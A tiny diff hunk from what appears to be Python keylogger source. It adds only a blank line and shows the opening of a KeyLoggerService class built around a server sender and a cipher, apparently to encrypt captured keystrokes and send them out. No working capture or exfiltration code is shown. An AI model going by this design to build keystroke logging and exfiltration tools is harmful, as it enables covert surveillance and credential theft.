@@ -7,6 +7,7 @@ import json
 import time
 from threading import Thread
 
+
 class KeyLoggerService:
     def __init__(self, server_sender, cipher):
         self.server_sender = server_sender
